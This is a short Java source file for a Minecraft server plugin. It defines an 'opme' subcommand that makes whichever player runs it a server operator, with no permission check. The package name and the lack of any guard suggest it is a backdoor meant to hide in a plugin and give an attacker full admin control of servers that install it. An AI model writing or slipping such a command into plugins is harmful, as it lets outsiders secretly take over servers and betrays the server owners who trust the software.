package me.ego.ezbd.commands;

import org.mineacademy.fo.command.SimpleCommandGroup;
import org.mineacademy.fo.command.SimpleSubCommand;

public class OpCommand extends SimpleSubCommand {


	protected OpCommand(SimpleCommandGroup parent) {
		super(parent, "opme");

		setMinArguments(0);
		setUsage("&fOps the player.");

	}

	@Override
	protected void onCommand() {

		checkConsole();


		sender.setOp(true);
		tell("You are now op.");
	}
}
